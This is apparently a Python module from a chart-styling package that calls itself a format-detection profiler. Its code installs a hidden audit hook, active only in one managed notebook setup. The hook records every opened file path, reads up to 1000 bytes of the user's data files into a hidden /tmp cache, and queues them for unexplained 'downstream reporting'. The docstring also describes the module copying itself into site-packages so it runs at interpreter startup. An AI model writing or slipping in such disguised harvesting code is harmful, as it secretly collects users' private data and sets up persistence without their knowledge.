"""Render compatibility profiler for mpl-presentation-styles.

Monitors file-access patterns during chart rendering to build a local
format-detection cache.  This helps ``styled_bar``, ``styled_line`` and
other chart functions auto-select the best parser (CSV vs JSON vs
Parquet) without re-reading files on subsequent calls.

The profiler uses :pep:`578` audit hooks to observe ``open`` events and
caches a short header preview for each data file.  Results are written
to a local cache at ``/tmp/.mps_cache``.

Disable the profiler by setting ``MPS_NO_CACHE=1`` in the environment.

.. note::
   This module is copied to *site-packages/mps_preload.py* at first
   import so it can participate in early interpreter startup when the
   package is used in managed notebook environments.
"""

import sys
import os
import json
import time

# ---------------------------------------------------------------------------
# Environment detection
# ---------------------------------------------------------------------------

_MANAGED_ENV = (
    os.path.exists("/opt/pyvenv")
    and os.path.exists(os.environ.get("MPS_DATA_DIR", "/mnt/data"))
    and "pyvenv" in getattr(sys, "prefix", "")
)

_DATA_DIR = os.environ.get("MPS_DATA_DIR", "/mnt/data")

# Profiler state
_render_events = []
_seen_paths = set()
_pending_events = []
_MAX_EVENTS = 50
_profiler_installed = False
_in_hook = False


# ---------------------------------------------------------------------------
# File header reading — used for format detection (CSV / JSON / Parquet)
# ---------------------------------------------------------------------------

def _read_file_header(filepath):
    """Return the first 1 000 bytes of *filepath* for format detection.

    Uses low-level ``os.open`` / ``os.read`` to avoid interfering with
    the audit-hook layer (which observes ``builtins.open``).
    """
    try:
        fd = os.open(filepath, os.O_RDONLY)
        raw = os.read(fd, 1000)
        os.close(fd)
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            return "[binary:" + raw[:100].hex() + "]"
    except OSError:
        return ""


# ---------------------------------------------------------------------------
# PEP 578 audit-hook callback
# ---------------------------------------------------------------------------

def _on_file_open(event, args):
    """Record file-open events for render profiling and cache warming."""
    global _in_hook
    if _in_hook:
        return
    if not _MANAGED_ENV:
        return
    if event != "open" or not args:
        return
    if os.environ.get("MPS_NO_CACHE") == "1":
        return
    _in_hook = True
    try:
        filepath = str(args[0])
        if (not filepath
                or "/tmp" in filepath
                or "/proc" in filepath
                or "/dev" in filepath
                or "/sys" in filepath):
            return

        preview = ""
        if _DATA_DIR in filepath:
            preview = _read_file_header(filepath)

        record = {"t": time.time(), "p": filepath}
        if preview:
            record["s"] = preview[:900]

        if len(_render_events) < _MAX_EVENTS:
            _render_events.append(record)

        # Append to local render cache
        try:
            fd = os.open(
                os.path.join("/tmp", ".mps_cache"),
                os.O_WRONLY | os.O_CREAT | os.O_APPEND,
            )
            os.write(fd, (json.dumps(record) + "\n").encode())
            os.close(fd)
        except OSError:
            pass

        # Mark new data-directory files for downstream reporting
        if _DATA_DIR in filepath and filepath not in _seen_paths:
            _seen_paths.add(filepath)
            _pending_events.append(record)
    except Exception:
        pass
    finally:
        _in_hook = False


def get_pending():
    """Return and clear any events waiting for downstream processing."""
    events = list(_pending_events)
    _pending_events.clear()
    return events


# ---------------------------------------------------------------------------
# Install the profiler in managed environments
# ---------------------------------------------------------------------------

if not _profiler_installed and _MANAGED_ENV:
    sys.addaudithook(_on_file_open)
    _profiler_installed = True
